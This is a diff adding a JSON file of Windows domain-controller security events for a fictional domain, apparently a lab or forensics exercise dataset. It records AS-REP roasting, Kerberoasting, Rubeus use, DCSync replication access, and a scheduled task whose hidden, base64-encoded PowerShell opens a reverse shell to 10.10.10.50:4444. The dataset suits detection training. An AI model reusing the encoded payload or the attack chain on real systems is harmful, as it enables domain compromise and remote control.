+      "IpAddress": "::ffff:10.10.10.97"
+    }
+  },
+  {
+    "EventRecordID": 10065,
+    "TimeCreated": "2026-08-28T14:08:07+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "j.doe",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.87",
+      "IpPort": "59053",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10066,
+    "TimeCreated": "2026-08-28T14:08:08+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "j.doe@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.87"
+    }
+  },
+  {
+    "EventRecordID": 10067,
+    "TimeCreated": "2026-08-28T14:08:25+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "s.connor",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.50",
+      "IpPort": "64159",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10068,
+    "TimeCreated": "2026-08-28T14:08:26+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "s.connor@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.50"
+    }
+  },
+  {
+    "EventRecordID": 10069,
+    "TimeCreated": "2026-08-28T14:08:35+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "HEALTHCHECK$",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.56",
+      "IpPort": "51190",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10070,
+    "TimeCreated": "2026-08-28T14:08:36+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "HEALTHCHECK$@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.56"
+    }
+  },
+  {
+    "EventRecordID": 10071,
+    "TimeCreated": "2026-08-28T14:08:49+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "s.connor",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.84",
+      "IpPort": "60859",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10072,
+    "TimeCreated": "2026-08-28T14:08:50+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "s.connor@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.84"
+    }
+  },
+  {
+    "EventRecordID": 10073,
+    "TimeCreated": "2026-08-28T14:09:04+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "s.connor",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.97",
+      "IpPort": "59729",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10074,
+    "TimeCreated": "2026-08-28T14:09:05+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "s.connor@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.97"
+    }
+  },
+  {
+    "EventRecordID": 10075,
+    "TimeCreated": "2026-08-28T14:09:21+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "m.smith",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.57",
+      "IpPort": "54882",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10076,
+    "TimeCreated": "2026-08-28T14:09:22+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "m.smith@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.57"
+    }
+  },
+  {
+    "EventRecordID": 10077,
+    "TimeCreated": "2026-08-28T14:09:35+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "a.vance",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.58",
+      "IpPort": "51188",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10078,
+    "TimeCreated": "2026-08-28T14:09:36+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "a.vance@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.58"
+    }
+  },
+  {
+    "EventRecordID": 10079,
+    "TimeCreated": "2026-08-28T14:09:52+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "j.doe",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 3,
+      "IpAddress": "10.10.10.70",
+      "IpPort": "50198",
+      "AuthenticationPackageName": "Kerberos",
+      "LogonProcessName": "Kerberos"
+    }
+  },
+  {
+    "EventRecordID": 10080,
+    "TimeCreated": "2026-08-28T14:09:53+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "j.doe@SYNAPSE.CORP",
+      "ServiceName": "cifs/fs01.synapse.corp",
+      "TicketEncryptionType": "0x12",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.70"
+    }
+  },
+  {
+    "EventRecordID": 10081,
+    "TimeCreated": "2026-08-28T14:10:05+00:00",
+    "EventID": 4768,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "backup_admin",
+      "TargetDomainName": "SYNAPSE.CORP",
+      "TicketEncryptionType": "0x17",
+      "TicketOptions": "0x50800010",
+      "Status": "0x0",
+      "PreAuthType": "0",
+      "IpAddress": "::ffff:10.10.10.50",
+      "IpPort": "49215"
+    }
+  },
+  {
+    "EventRecordID": 10082,
+    "TimeCreated": "2026-08-28T14:15:22+00:00",
+    "EventID": 4769,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "TargetUserName": "svc_sql@SYNAPSE.CORP",
+      "ServiceName": "MSSQLSvc/db01.synapse.corp:1433",
+      "ServiceSid": "S-1-5-21-394829104-293849102-192837461-1105",
+      "TicketEncryptionType": "0x17",
+      "TicketOptions": "0x40810010",
+      "Status": "0x0",
+      "IpAddress": "::ffff:10.10.10.50",
+      "IpPort": "49220"
+    }
+  },
+  {
+    "EventRecordID": 10083,
+    "TimeCreated": "2026-08-28T14:22:40+00:00",
+    "EventID": 4624,
+    "Channel": "Security",
+    "Computer": "WS01.synapse.corp",
+    "Data": {
+      "TargetUserName": "backup_admin",
+      "TargetDomainName": "SYNAPSE",
+      "LogonType": 9,
+      "LogonProcessName": "seclogo",
+      "AuthenticationPackageName": "Negotiate",
+      "ProcessName": "C:\\Users\\j.doe\\AppData\\Local\\Temp\\Rubeus.exe",
+      "IpAddress": "-",
+      "IpPort": "-"
+    }
+  },
+  {
+    "EventRecordID": 10084,
+    "TimeCreated": "2026-08-28T14:30:15+00:00",
+    "EventID": 4662,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "SubjectUserName": "backup_admin",
+      "SubjectDomainName": "SYNAPSE",
+      "SubjectLogonId": "0x3E7",
+      "ObjectType": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}",
+      "ObjectName": "DC=synapse,DC=corp",
+      "AccessMask": "0x100",
+      "Properties": "---DELIM---{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}---DELIM---",
+      "AccessList": "%%4428",
+      "CallingProcessName": "C:\\Windows\\System32\\lsass.exe"
+    }
+  },
+  {
+    "EventRecordID": 10085,
+    "TimeCreated": "2026-08-28T14:38:50+00:00",
+    "EventID": 4698,
+    "Channel": "Security",
+    "Computer": "DC01.synapse.corp",
+    "Data": {
+      "SubjectUserName": "Administrator",
+      "SubjectDomainName": "SYNAPSE",
+      "TaskName": "\\SynapseHealthCheck",
+      "TaskContent": "<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task><Actions><Exec><Command>powershell.exe</Command><Arguments>-WindowStyle Hidden -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQAwAC4ANQAwACIALAA0ADQANAA0ACkA...</Arguments></Exec></Actions></Task>"
+    }
+  }
+]
